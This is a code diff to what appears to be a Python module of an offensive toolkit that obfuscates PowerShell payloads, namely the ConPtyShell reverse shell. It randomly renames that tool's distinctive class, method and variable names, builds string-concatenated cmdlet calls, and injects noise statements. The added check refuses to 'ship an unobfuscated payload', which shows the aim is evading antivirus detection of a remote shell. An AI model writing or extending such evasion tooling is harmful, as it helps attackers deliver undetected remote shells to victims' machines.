@@ -26,7 +26,6 @@ def _split_parts(s: str) -> list[str]:
 
 
 def _random_split(cmdlet: str) -> str:
-    """String-concatenation call: &('New-'+'Object') or &('A'+'dd'+'-Type'). Used by syntax obfuscator."""
     parts = _split_parts(cmdlet)
     q = random.choice(('"', "'"))
     return "&(" + "+".join(f"{q}{p}{q}" for p in parts) + ")"
@@ -119,22 +118,25 @@ def ps_base64_encode(payload: str) -> str:
 
 
 def obfuscate_conptyshell(ps1_data: bytes) -> tuple[bytes, str]:
-    """Obfuscate a ConPtyShell PS1 in memory, returning it with its new name."""
     payload = ps1_data.decode("utf-8", errors="replace")
 
+    # A no-op rename would ship the original identifiers or point invoke at a missing name.
+    if "Invoke-ConPtyShell" not in payload:
+        raise ValueError(
+            "fetched ConPtyShell has no 'Invoke-ConPtyShell' entry point; "
+            "upstream layout changed, refusing to ship an unobfuscated payload"
+        )
+
+    # Order matters: renames[0] is the entry point, renames[-1] the C# source var.
     renames: list[tuple[str, str]] = [
-        # PS function name
         ("Invoke-ConPtyShell",              "Invoke-" + _rand_ident(9)),
-        # ConPty-prefixed class names
         ("ConPtyShellMainClass",            _rand_ident(12)),
         ("ConPtyShellException",            _rand_ident(10)),
         ("SpawnConPtyShell",                _rand_ident(11)),
         ("ConPtyShell",                     _rand_ident(11)),
-        # Other class names (all end up in MSIL type metadata)
         ("SocketHijacking",                 _rand_ident(12)),
         ("DeadlockCheckHelper",             _rand_ident(12)),
         ("ParentProcessUtilities",          _rand_ident(14)),
-        # Distinctive method names
         ("NtQuerySystemInformationDynamic", _rand_ident(14)),
         ("NtQueryObjectDynamic",            _rand_ident(12)),
         ("QueryObjectTypesInfo",            _rand_ident(12)),
@@ -152,7 +154,6 @@ def obfuscate_conptyshell(ps1_data: bytes) -> tuple[bytes, str]:
         ("ThreadCheckDeadlock",             _rand_ident(12)),
         ("GetParentProcess",                _rand_ident(11)),
         ("AlignUp",                         _rand_ident(8)),
-        # PS variable holding the C# source
         ("$Source",                         "$" + _rand_ident(8)),
     ]
     new_fn  = renames[0][1]
@@ -199,11 +200,7 @@ _PS_VAR_RE = re.compile(r'\$[a-zA-Z_][a-zA-Z0-9_]*')
 
 
 def ps_variable_obfuscate(payload: str) -> str:
-    """Rename user-defined PowerShell variables in a single regex pass.
-
-    Matches full tokens so $a cannot mangle $ab. Reserved variables and scope
-    qualifiers are left alone; $Data and $data map to the same new name.
-    """
+    """Full-token match so $a cannot mangle $ab; reserved vars are left alone."""
     mapping: dict[str, str] = {}
 
     def _repl(m: "re.Match[str]") -> str:
@@ -219,9 +216,6 @@ def ps_variable_obfuscate(payload: str) -> str:
 
 
 def ps_bullshit_obfuscate(payload: str) -> str:
-    """
-    Insert random no-op statements into a PowerShell payload to make it harder
-    """
     def generate_noise_chain():
         rands1 = ''.join(random.choices(string.ascii_letters, k=5))
         rands2 = ''.join(random.choices(string.ascii_letters, k=5))
